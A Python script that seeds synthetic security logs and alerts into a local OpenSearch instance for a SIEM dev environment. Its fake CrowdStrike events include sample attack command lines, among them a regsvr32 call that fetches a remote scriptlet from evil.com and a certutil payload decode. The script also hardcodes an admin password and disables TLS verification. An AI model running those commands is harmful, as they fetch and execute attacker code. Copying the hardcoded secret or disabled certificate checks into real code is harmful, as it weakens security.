#!/usr/bin/env python3
"""
Seed realistic log and alert data into OpenSearch for NilaChakra dev environment.
Creates v11-log-<type>-YYYY.MM.DD and v11-alert-YYYY.MM.DD indices.
"""
import json, uuid, random, urllib.request, urllib.error, ssl, base64
from datetime import datetime, timedelta, timezone

OS_URL  = "https://localhost:9200"
OS_USER = "admin"
OS_PASS = "LocalDev@2024!"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
creds = base64.b64encode(f"{OS_USER}:{OS_PASS}".encode()).decode()
headers = {"Content-Type": "application/json", "Authorization": f"Basic {creds}"}

def req(method, path, body=None):
    url = OS_URL + path
    data = json.dumps(body).encode() if body else None
    r = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, context=ctx, timeout=15) as res:
            return json.loads(res.read())
    except urllib.error.HTTPError as e:
        return {"error": e.code, "msg": e.read().decode()[:200]}

def bulk(actions):
    body = "\n".join(json.dumps(a) for a in actions) + "\n"
    data = body.encode()
    r = urllib.request.Request(OS_URL + "/_bulk", data=data,
        headers={**headers, "Content-Type": "application/x-ndjson"}, method="POST")
    try:
        with urllib.request.urlopen(r, context=ctx, timeout=30) as res:
            return json.loads(res.read())
    except urllib.error.HTTPError as e:
        return {"error": e.code, "msg": e.read().decode()[:200]}

def ts(offset_hours=0):
    t = datetime.now(timezone.utc) - timedelta(hours=offset_hours)
    return t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

def date_suffix(offset_hours=0):
    t = datetime.now(timezone.utc) - timedelta(hours=offset_hours)
    return t.strftime("%Y.%m.%d")

def rip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def rport():
    return random.choice([22, 80, 443, 3389, 8080, 445, 135, 53, 25, 587])

USERS = ["john.doe","jane.smith","admin","root","svc_backup","svc_sql","bob.jones","alice.wu","SYSTEM","NT AUTHORITY\\SYSTEM"]
HOSTS = ["WIN-DC01","WIN-WEB01","WIN-SQL01","LINUX-PROXY","LINUX-DB01","mac-dev-01","WIN-LAPTOP-01","aws-ec2-prod"]
DOMAINS = ["corp.nilachakra.local","nilachakra.local","WORKGROUP"]
COUNTRIES = ["US","GB","RU","CN","DE","BR","IN","JP","AU","CA","FR","NL","KR","UA","IR"]
CITIES = ["New York","London","Moscow","Beijing","Berlin","São Paulo","Mumbai","Tokyo","Sydney","Toronto"]
ASNS = ["AS3356 Level 3","AS15169 Google","AS8075 Microsoft","AS16509 Amazon","AS1234 CloudFlare","AS55555 Suspicious ISP"]

print("=== NilaChakra OpenSearch Seed Data ===")
print(f"Target: {OS_URL}")

# ─────────────────────────────────────────────
# LOG GENERATORS — one per integration type
# ─────────────────────────────────────────────

def log_windows(h=0):
    ec = random.choice([4624,4625,4634,4648,4688,4698,4702,4719,4728,4732,4740,4767,4768,4769,4776,1102,7045,7036])
    user = random.choice(USERS)
    src_ip = rip()
    return {
        "@timestamp": ts(h),
        "dataType": "windows-security",
        "dataSource": random.choice(HOSTS),
        "logx": {"wineventlog": {
            "event_id": ec,
            "log_name": "Security",
            "event_name": {4624:"An account was successfully logged on",4625:"An account failed to log on",
                           4688:"A new process has been created",4698:"A scheduled task was created",
                           4769:"A Kerberos service ticket was requested",1102:"The audit log was cleared",
                           7045:"A new service was installed",4740:"A user account was locked out"}.get(ec,"Windows event"),
            "computer_name": random.choice(HOSTS),
            "event_data": {"SubjectUserName":user,"SubjectDomainName":random.choice(DOMAINS),
                           "TargetUserName":random.choice(USERS),"TargetDomainName":random.choice(DOMAINS),
                           "IpAddress":src_ip,"IpPort":str(rport()),"LogonType":str(random.choice([2,3,7,10])),
                           "ProcessName":random.choice(["C:\\Windows\\System32\\cmd.exe","C:\\Windows\\System32\\powershell.exe",
                                                        "C:\\Windows\\explorer.exe","C:\\Program Files\\Chrome\\chrome.exe"]),
                           "Status":"0xC000006D","SubStatus":"0xC0000064","WorkstationName":random.choice(HOSTS)}
        }},
        "origin": {"ip": src_ip,"port": rport(),"host": random.choice(HOSTS),
                   "country": random.choice(COUNTRIES),"city": random.choice(CITIES),
                   "asn": random.choice(ASNS),"user": user},
        "target": {"ip": rip(),"port": rport(),"host": random.choice(HOSTS),"user": random.choice(USERS)},
        "log": {"eventCode": ec},
        "tags": []
    }

def log_linux(h=0):
    prog = random.choice(["sshd","sudo","su","cron","kernel","systemd","auditd","bash"])
    user = random.choice(USERS)
    src_ip = rip()
    msgs = {
        "sshd": [f"Failed password for {user} from {src_ip} port {rport()} ssh2",
                 f"Accepted password for {user} from {src_ip} port {rport()} ssh2",
                 f"Invalid user {user} from {src_ip}"],
        "sudo": [f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/passwd",
                 f"{user} : command not allowed"],
        "kernel": ["TCP: drop open request from "+src_ip+f":{rport()} to 0.0.0.0:22",
                   "Possible SYN flooding on port 80. Sending cookies."],
        "cron": [f"(root) CMD (/usr/bin/find / -name '*.log' -mtime +7 -delete)",
                 f"(CRON) info (No MTA installed, discarding output)"],
        "auditd": [f"type=USER_AUTH msg=audit: op=macsec_activate acct={user} res=failed"]
    }
    msg = random.choice(msgs.get(prog, [f"{prog}: operation completed by {user}"]))
    return {
        "@timestamp": ts(h), "dataType": "linux-auth",
        "dataSource": random.choice(HOSTS),
        "logx": {"linux": {"message": msg,"program": prog,
                           "pid": random.randint(1000,65000),"severity": random.choice(["info","warn","error","crit"])}},
        "origin": {"ip": src_ip,"port": rport(),"host": random.choice(HOSTS),
                   "country": random.choice(COUNTRIES),"user": user},
        "target": {"ip": rip(),"host": random.choice(HOSTS)},
        "tags": []
    }

def log_aws(h=0):
    events = ["ConsoleLogin","AssumeRole","CreateUser","DeleteUser","AttachRolePolicy","DetachRolePolicy",
              "CreateBucket","DeleteBucket","PutObject","GetObject","DescribeInstances","RunInstances",
              "StopInstances","TerminateInstances","AuthorizeSecurityGroupIngress","CreateSecurityGroup",
              "GetSecretValue","ListSecrets","CreateKey","ScheduleKeyDeletion"]
    svc = random.choice(["signin","iam","s3","ec2","kms","secretsmanager","cloudtrail","lambda"])
    event = random.choice(events)
    src_ip = rip()
    return {
        "@timestamp": ts(h), "dataType": "aws-cloudtrail",
        "dataSource": f"aws-account-{random.randint(100000,999999)}",
        "logx": {"aws": {
            "eventVersion":"1.08","userIdentity":{"type":"IAMUser",
                "principalId":f"AIDAAAAAAAAAAAAAAA{random.randint(10,99)}",
                "arn":f"arn:aws:iam::{random.randint(100000000000,999999999999)}:user/{random.choice(USERS)}",
                "accountId":str(random.randint(100000000000,999999999999)),"userName":random.choice(USERS)},
            "eventSource":f"{svc}.amazonaws.com","eventName":event,
            "awsRegion":random.choice(["us-east-1","us-west-2","eu-west-1","ap-southeast-1"]),
            "sourceIPAddress":src_ip,"userAgent":"aws-cli/2.x Python/3.x",
            "requestParameters":{"bucketName":f"bucket-{random.randint(1,100)}"} if "Bucket" in event else {},
            "responseElements":None if random.random()>0.3 else {"ConsoleLogin":"Success"},
            "errorCode":None if random.random()>0.2 else random.choice(["AccessDenied","NoSuchKey","InvalidClientTokenId"]),
            "errorMessage":None if random.random()>0.2 else "User is not authorized to perform this operation"
        }},
        "origin": {"ip": src_ip,"country": random.choice(COUNTRIES),"user": random.choice(USERS)},
        "target": {"ip": rip()},
        "tags": []
    }

def log_firewall(h=0):
    actions = ["allow","deny","drop","reject"]
    protocols = ["TCP","UDP","ICMP","GRE"]
    src_ip = rip(); dst_ip = rip()
    return {
        "@timestamp": ts(h), "dataType": "firewall-generic",
        "dataSource": random.choice(["FW-EDGE-01","FW-DMZ-01","PFSENSE-01","ASA-MAIN"]),
        "logx": {"firewall": {
            "action": random.choice(actions),
            "protocol": random.choice(protocols),
            "src_ip": src_ip,"src_port": rport(),
            "dst_ip": dst_ip,"dst_port": rport(),
            "bytes_sent": random.randint(64,65535),
            "bytes_recv": random.randint(64,65535),
            "packets": random.randint(1,1000),
            "duration": random.randint(0,3600),
            "interface_in": random.choice(["eth0","ge-0/0/0","outside","WAN"]),
            "interface_out": random.choice(["eth1","ge-0/0/1","inside","LAN"]),
            "rule_id": str(random.randint(1,9999)),
            "policy": random.choice(["PERMIT_WEB","DENY_EXTERNAL","ALLOW_VPN","DEFAULT_DENY"])
        }},
        "origin": {"ip": src_ip,"port": rport(),"country": random.choice(COUNTRIES),"asn": random.choice(ASNS)},
        "target": {"ip": dst_ip,"port": rport()},
        "network": {"bytes_toclient": random.randint(64,65535),"bytes_toserver": random.randint(64,65535),
                    "proto": random.choice(protocols).lower()},
        "tags": []
    }

def log_o365(h=0):
    ops = ["UserLoggedIn","PasswordLogonInitial","FileAccessed","FileDownloaded","FileUploaded","FileDeleted",
           "MailboxLogin","Send","MoveToDeletedItems","Set-MalwareFilterPolicy","New-InboxRule",
           "Set-InboxRule","Add-MailboxPermission","Set-AdminAuditLogConfig"]
    user = random.choice(USERS) + "@nilachakra.com"
    src_ip = rip()
    return {
        "@timestamp": ts(h), "dataType": "o365",
        "dataSource": f"o365-tenant-nilachakra",
        "logx": {"o365": {
            "Operation": random.choice(ops),
            "UserId": user,
            "ClientIP": src_ip,
            "UserAgent": random.choice(["Mozilla/5.0","Microsoft Office","Outlook/16.0","Edge/120.0"]),
            "Platform": random.choice(["Windows","Mac","iOS","Android","Web"]),
            "Workload": random.choice(["Exchange","SharePoint","OneDrive","Teams","AzureActiveDirectory"]),
            "ObjectId": f"https://nilachakra-my.sharepoint.com/Documents/file{random.randint(1,100)}.docx",
            "ResultStatus": random.choice(["Succeeded","Failed","PartiallySucceeded"]),
            "ErrorNumber": random.choice([None,"0","403","404"]),
            "AuthenticationType": random.choice(["OAuth2","Federated","OAuthToken"]),
            "IsCompliant": random.choice([True,False]),
            "DeviceId": str(uuid.uuid4()),
            "Country": random.choice(COUNTRIES)
        }},
        "origin": {"ip": src_ip,"country": random.choice(COUNTRIES),"user": user},
        "target": {"host": "nilachakra.sharepoint.com"},
        "tags": []
    }

def log_cisco_asa(h=0):
    msg_ids = [106001,106006,106007,106015,106023,110003,302013,302014,302020,305009,
               313001,313004,402114,419001,419002,500004,605005,710003,713172]
    msg_id = random.choice(msg_ids)
    src_ip = rip(); dst_ip = rip()
    templates = {
        106001: f"%ASA-2-106001: Inbound TCP connection denied from {src_ip}/{rport()} to {dst_ip}/{rport()} flags SYN on interface outside",
        106023: f"%ASA-4-106023: Deny tcp src outside:{src_ip}/{rport()} dst inside:{dst_ip}/{rport()} by access-group OUTSIDE_IN",
        302013: f"%ASA-6-302013: Built outbound TCP connection {random.randint(100000,999999)} for outside:{src_ip}/{rport()} to inside:{dst_ip}/{rport()}",
        302014: f"%ASA-6-302014: Teardown TCP connection {random.randint(100000,999999)} duration 0:00:{random.randint(1,59):02d} bytes {random.randint(500,100000)} TCP FINs",
        710003: f"%ASA-3-710003: TCP access denied by ACL from {src_ip}/{rport()} to outside:{dst_ip}/443"
    }
    msg = templates.get(msg_id, f"%ASA-6-{msg_id}: Connection event from {src_ip} to {dst_ip}")
    return {
        "@timestamp": ts(h), "dataType": "cisco-asa",
        "dataSource": random.choice(["ASA-PRIMARY","ASA-SECONDARY","FTD-01"]),
        "logx": {"cisco_asa": {"message_id": msg_id,"message": msg,
                               "severity": random.choice(["2","3","4","5","6"]),
                               "src_ip": src_ip,"src_port": rport(),
                               "dst_ip": dst_ip,"dst_port": rport(),
                               "protocol": random.choice(["TCP","UDP"]),
                               "interface": random.choice(["outside","inside","dmz"])}},
        "origin": {"ip": src_ip,"port": rport(),"country": random.choice(COUNTRIES)},
        "target": {"ip": dst_ip,"port": rport()},
        "tags": []
    }

def log_suricata(h=0):
    sigs = [
        (2001219,"ET SCAN Potential SSH Scan","Attempted Information Leak"),
        (2010937,"ET MALWARE Suspicious User-Agent","Malware CNC"),
        (2019714,"ET EXPLOIT EternalBlue Attempt","Attempted Administrator Privilege Gain"),
        (2100498,"GPL ATTACK_RESPONSE id check returned root","Potentially Bad Traffic"),
        (2012648,"ET COMPROMISE Possible Compromised Device","Misc Attack"),
        (2023468,"ET HUNTING Suspicious TLS SNI to Cloudflare","Potentially Bad Traffic")
    ]
    sig = random.choice(sigs)
    src_ip = rip(); dst_ip = rip()
    return {
        "@timestamp": ts(h), "dataType": "suricata",
        "dataSource": random.choice(["SURICATA-SENSOR-01","IDS-DMZ","IPS-EDGE"]),
        "logx": {"suricata": {
            "alert": {"action": random.choice(["allowed","blocked"]),"gid":1,
                      "signature_id": sig[0],"rev":4,"signature": sig[1],
                      "category": sig[2],"severity": random.randint(1,3)},
            "src_ip": src_ip,"src_port": rport(),
            "dest_ip": dst_ip,"dest_port": rport(),
            "proto": random.choice(["TCP","UDP"]),
            "flow_id": random.randint(1000000000,9999999999),
            "in_iface": random.choice(["eth0","eth1","ens3"]),
            "payload": base64.b64encode(b"GET / HTTP/1.1\r\nHost: example.com").decode()
        }},
        "origin": {"ip": src_ip,"port": rport(),"country": random.choice(COUNTRIES)},
        "target": {"ip": dst_ip,"port": rport()},
        "tags": []
    }

def log_azure(h=0):
    ops = ["Microsoft.Compute/virtualMachines/write","Microsoft.Storage/storageAccounts/delete",
           "Microsoft.KeyVault/vaults/secrets/read","Microsoft.Authorization/roleAssignments/write",
           "Microsoft.Network/networkSecurityGroups/write","Microsoft.Sql/servers/firewallRules/write",
           "Microsoft.Resources/deployments/write","Microsoft.Insights/alertRules/write"]
    categories = ["Administrative","Security","Policy","Alert","SignInLogs","AuditLogs"]
    src_ip = rip()
    return {
        "@timestamp": ts(h), "dataType": "azure",
        "dataSource": f"azure-subscription-{random.randint(1,5)}",
        "logx": {"azure": {
            "operationName": random.choice(ops),
            "category": random.choice(categories),
            "callerIpAddress": src_ip,
            "caller": random.choice(USERS)+"@nilachakra.onmicrosoft.com",
            "correlationId": str(uuid.uuid4()),
            "level": random.choice(["Informational","Warning","Error","Critical"]),
            "resultType": random.choice(["Success","Failure","Start"]),
            "resultSignature": random.choice(["Succeeded","Failed","BadRequest","Unauthorized"]),
            "durationMs": random.randint(10,5000),
            "subscriptionId": str(uuid.uuid4()),
            "resourceGroup": random.choice(["rg-prod","rg-dev","rg-security","rg-network"]),
            "resourceType": "Microsoft.Compute/virtualMachines",
            "resourceId": f"/subscriptions/{uuid.uuid4()}/resourceGroups/rg-prod/providers/Microsoft.Compute/virtualMachines/vm-{random.randint(1,20)}"
        }},
        "origin": {"ip": src_ip,"country": random.choice(COUNTRIES),"user": random.choice(USERS)},
        "target": {"ip": rip()},
        "tags": []
    }

def log_crowdstrike(h=0):
    event_types = ["AuthActivityAuditEvent","DetectionSummaryEvent","IncidentSummaryEvent",
                   "NetworkConnectionIP4","ProcessRollupV2","UserActivityAuditEvent","SyntheticRemediation"]
    tactic = random.choice(["Collection","Command and Control","Credential Access","Defense Evasion",
                            "Discovery","Execution","Exfiltration","Impact","Initial Access",
                            "Lateral Movement","Persistence","Privilege Escalation","Reconnaissance"])
    src_ip = rip()
    return {
        "@timestamp": ts(h), "dataType": "crowdstrike",
        "dataSource": f"crowdstrike-cid-{random.randint(1000,9999)}",
        "logx": {"crowdstrike": {
            "EventType": random.choice(event_types),
            "DetectId": str(uuid.uuid4()),
            "DetectName": random.choice(["Credential Theft","Lateral Movement Attempt","Suspicious Process",
                                          "Ransomware Behavior","Malicious Script Execution","Data Exfiltration"]),
            "Severity": random.randint(1,100),
            "SeverityName": random.choice(["Informational","Low","Medium","High","Critical"]),
            "Tactic": tactic,"Technique": f"T{random.randint(1000,1800)}",
            "ComputerName": random.choice(HOSTS),
            "UserName": random.choice(USERS),
            "FileName": random.choice(["cmd.exe","powershell.exe","wscript.exe","mshta.exe","malware.exe"]),
            "FilePath": random.choice(["C:\\Windows\\Temp\\","C:\\Users\\Public\\","C:\\ProgramData\\"]),
            "SHA256": uuid.uuid4().hex + uuid.uuid4().hex,
            "CommandLine": random.choice(["cmd /c whoami","powershell -enc AAABBB","net user /domain",
                                           "certutil -decode payload.txt shell.exe","regsvr32 /u /s /i:http://evil.com/payload.sct scrobj.dll"]),
            "ParentFileName": random.choice(["explorer.exe","winword.exe","excel.exe","outlook.exe"]),
            "LocalAddress": src_ip,"RemoteAddress": rip(),
            "LocalPort": rport(),"RemotePort": rport()
        }},
        "origin": {"ip": src_ip,"host": random.choice(HOSTS),"user": random.choice(USERS),"country": random.choice(COUNTRIES)},
        "target": {"ip": rip()},
        "tags": []
    }

def log_netflow(h=0):
    protocols = {6:"TCP",17:"UDP",1:"ICMP",47:"GRE",50:"ESP",89:"OSPF"}
    proto_num = random.choice(list(protocols.keys()))
    src_ip = rip(); dst_ip = rip()
    return {
        "@timestamp": ts(h), "dataType": "netflow",
        "dataSource": random.choice(["ROUTER-CORE-01","SWITCH-DIST-01","COLLECTOR-01"]),
        "logx": {"netflow": {
            "src_addr": src_ip,"dst_addr": dst_ip,
            "src_port": rport(),"dst_port": rport(),
            "protocol": proto_num,"proto_name": protocols[proto_num],
            "bytes_in": random.randint(64,10000000),
            "bytes_out": random.randint(64,10000000),
            "pkts_in": random.randint(1,10000),
            "pkts_out": random.randint(1,10000),
            "flow_start": ts(h+1),"flow_end": ts(h),
            "duration_ms": random.randint(10,300000),
            "tcp_flags": random.choice(["SYN","SYN-ACK","FIN","RST","PSH-ACK"]),
            "tos": 0,"input_snmp": random.randint(1,100),
            "output_snmp": random.randint(1,100),
            "src_as": random.randint(1000,65000),
            "dst_as": random.randint(1000,65000)
        }},
        "origin": {"ip": src_ip,"port": rport(),"country": random.choice(COUNTRIES),"asn": random.choice(ASNS)},
        "target": {"ip": dst_ip,"port": rport()},
        "network": {"bytes_toclient": random.randint(64,10000000),"bytes_toserver": random.randint(64,10000000),"proto": protocols[proto_num].lower()},
        "tags": []
    }

# ─────────────────────────────────────────────
# ALERT GENERATOR
# ─────────────────────────────────────────────

ALERT_NAMES = [
    ("Windows: Possible Brute Force Attack","Credential Access","T1110 - Brute Force","High",3,
     "Multiple failed login attempts detected from the same IP address."),
    ("Windows audit log was cleared","Defense Evasion","T1070.001 - Clear Windows Event Logs","High",3,
     "The Windows Security audit log has been cleared, which may indicate an attacker covering their tracks."),
    ("SSH Brute Force Attempt","Credential Access","T1110 - Brute Force","Medium",2,
     "Multiple SSH authentication failures detected from a single source IP."),
    ("Suspicious AWS Root Account Login","Initial Access","T1078 - Valid Accounts","High",3,
     "The AWS root account was used to log in. Root account usage should be minimal."),
    ("Outbound Connection to Known Malicious IP","Command and Control","T1071 - Application Layer Protocol","High",3,
     "A host initiated a connection to a known C2 server IP address."),
    ("O365 Inbox Rule Created for Email Forwarding","Collection","T1114.003 - Email Forwarding Rule","Medium",2,
     "A new inbox forwarding rule was created that may redirect emails to an external address."),
    ("Azure Privileged Role Assignment","Privilege Escalation","T1078 - Valid Accounts","Medium",2,
     "A privileged Azure AD role was assigned to a user account."),
    ("CrowdStrike: Malicious Script Execution","Execution","T1059 - Command and Scripting Interpreter","High",3,
     "CrowdStrike detected execution of a suspicious script with encoded command-line parameters."),
    ("Suricata: EternalBlue Exploit Attempt","Lateral Movement","T1210 - Exploitation of Remote Services","High",3,
     "The EternalBlue exploit (MS17-010) was detected targeting SMB port 445."),
    ("Netflow: Large Data Transfer to External IP","Exfiltration","T1041 - Exfiltration Over C2 Channel","Medium",2,
     "Unusually large amount of data was transferred to an external IP address."),
    ("Linux: Root Login via SSH","Initial Access","T1078 - Valid Accounts","Low",1,
     "Direct root login via SSH was detected. This may indicate unauthorized access."),
    ("Cisco ASA: Multiple Connection Denials","Defense Evasion","T1562 - Impair Defenses","Low",1,
     "Multiple consecutive connection denials from the same source IP detected."),
    ("Windows: New Admin User Created","Persistence","T1136 - Create Account","Medium",2,
     "A new user account was added to the local Administrators group."),
    ("AWS IAM Policy Modified","Privilege Escalation","T1078.004 - Cloud Accounts","Medium",2,
     "An IAM policy was attached or modified, potentially granting elevated permissions."),
    ("Credential Dumping via LSASS","Credential Access","T1003.001 - LSASS Memory","High",3,
     "Suspicious access to the LSASS process was detected, indicating possible credential dumping.")
]

CATEGORIES = ["antivirus","cisco","cloud","crowdstrike","fortinet","generic","github","ibm","json",
              "linux","macos","mikrotik","netflow","nids","office365","paloalto","pfsense",
              "sonicwall","sophos","suricata","syslog","vmware","windows"]

def make_alert(h=0):
    name, cat, tech, sev_label, sev, desc = random.choice(ALERT_NAMES)
    src_ip = rip(); dst_ip = rip()
    user = random.choice(USERS)
    host = random.choice(HOSTS)
    status = random.choice([1,1,1,2,3,4,5])  # mostly new
    alert_id = str(uuid.uuid4())
    is_incident = random.random() < 0.05
    return {
        "@timestamp": ts(h),
        "id": alert_id,
        "parentId": str(uuid.uuid4()) if random.random() < 0.3 else None,
        "name": name,
        "category": cat,
        "technique": tech,
        "severity": sev,
        "severityLabel": sev_label,
        "description": desc,
        "solution": "Review the associated events, isolate the affected system, and rotate compromised credentials if applicable.",
        "reference": [f"https://attack.mitre.org/techniques/{tech.split(' - ')[0].replace('T','')}"],
        "status": status,
        "statusLabel": {1:"automatic_review",2:"open",3:"in_review",4:"ignored",5:"completed"}.get(status,"automatic_review"),
        "statusObservation": "The system changed the alert status to be analyzed by rule engine" if status==1 else None,
        "isIncident": is_incident,
        "incidentDetail": {"createdBy":"","observation":"","source":"","creationDate":""} if not is_incident else {
            "createdBy": random.choice(USERS),"observation": "Escalated for investigation",
            "source": "auto","creationDate": ts(h)
        },
        "dataType": random.choice(["windows-security","linux-auth","aws-cloudtrail","o365",
                                    "crowdstrike","suricata","cisco-asa","netflow","azure","firewall-generic"]),
        "dataSource": host,
        "impact": {"confidentiality": random.randint(0,3),"integrity": random.randint(0,3),"availability": random.randint(0,3)},
        "impactScore": random.randint(0,9),
        "adversary": {"ip": src_ip,"port": rport(),"host": host,
                      "country": random.choice(COUNTRIES),"city": random.choice(CITIES),
                      "asn": random.choice(ASNS),"user": user,
                      "coordinates": [round(random.uniform(-90,90),4), round(random.uniform(-180,180),4)]},
        "target": {"ip": dst_ip,"port": rport(),"host": random.choice(HOSTS),
                   "user": random.choice(USERS),"country": "US"},
        "tags": random.sample(["brute-force","lateral-movement","exfiltration","c2","persistence",
                                "privilege-escalation","data-theft","ransomware","false-positive"], k=random.randint(0,2)),
        "notes": "",
        "logs": [str(uuid.uuid4()) for _ in range(random.randint(1,5))],
        "deduplicatedBy": [random.choice(["origin.ip","target.user","dataSource"]) for _ in range(random.randint(0,2))],
        "tagRulesApplied": [],
        "events": None
    }

# ─────────────────────────────────────────────
# BULK INDEX HELPER
# ─────────────────────────────────────────────

def index_batch(index, docs):
    actions = []
    for doc in docs:
        actions.append({"index": {"_index": index}})
        actions.append(doc)
    result = bulk(actions)
    errors = result.get("errors", True)
    took = result.get("took", 0)
    items = result.get("items", [])
    ok = sum(1 for i in items if i.get("index",{}).get("result") in ("created","updated"))
    return ok, len(docs) - ok

# ─────────────────────────────────────────────
# MAIN — generate & index all data
# ─────────────────────────────────────────────

LOG_TYPES = [
    ("wineventlog",    log_windows,  200),
    ("linux",          log_linux,    150),
    ("aws",            log_aws,      120),
    ("firewall",       log_firewall, 100),
    ("o365",           log_o365,     100),
    ("cisco-asa",      log_cisco_asa, 80),
    ("suricata",       log_suricata,  80),
    ("azure",          log_azure,     80),
    ("crowdstrike",    log_crowdstrike, 60),
    ("netflow",        log_netflow,   60),
]

ALERT_COUNT = 300
total_ok = 0; total_fail = 0

print("\n── Indexing LOGS ──")
for dtype, gen_fn, count in LOG_TYPES:
    # spread over last 7 days (168 hours)
    docs = [gen_fn(random.randint(0, 167)) for _ in range(count)]
    # group by day suffix
    by_day = {}
    for doc in docs:
        t = datetime.fromisoformat(doc["@timestamp"].replace("Z","+00:00"))
        suffix = t.strftime("%Y.%m.%d")
        by_day.setdefault(suffix, []).append(doc)
    day_ok = day_fail = 0
    for day, day_docs in by_day.items():
        idx = f"v11-log-{dtype}-{day}"
        ok, fail = index_batch(idx, day_docs)
        day_ok += ok; day_fail += fail
    total_ok += day_ok; total_fail += day_fail
    print(f"  {dtype:20s} → {day_ok:4d} docs  ({day_fail} failed)")

print(f"\n── Indexing ALERTS ({ALERT_COUNT} docs) ──")
alert_docs = [make_alert(random.randint(0, 167)) for _ in range(ALERT_COUNT)]
by_day = {}
for doc in alert_docs:
    t = datetime.fromisoformat(doc["@timestamp"].replace("Z","+00:00"))
    suffix = t.strftime("%Y.%m.%d")
    by_day.setdefault(suffix, []).append(doc)
alert_ok = alert_fail = 0
for day, day_docs in by_day.items():
    idx = f"v11-alert-{day}"
    ok, fail = index_batch(idx, day_docs)
    alert_ok += ok; alert_fail += fail
total_ok += alert_ok; total_fail += alert_fail
print(f"  v11-alert-*          → {alert_ok:4d} docs  ({alert_fail} failed)")

print(f"\n── Summary ──")
print(f"  Total indexed : {total_ok}")
print(f"  Total failed  : {total_fail}")

print("\n── Index counts ──")
res = req("GET", "/_cat/indices/v11-*?v&s=index&h=index,docs.count")
if isinstance(res, list):
    for line in res: print(f"  {line}")
else:
    r2 = req("GET", "/_cat/indices/v11-*?format=json")
    if isinstance(r2, list):
        for i in r2:
            print(f"  {i.get('index','?'):50s} {i.get('docs.count','?'):>6} docs")

print("\n✅ Done! Refresh http://localhost:8880 and check Alerts/Discover pages.")
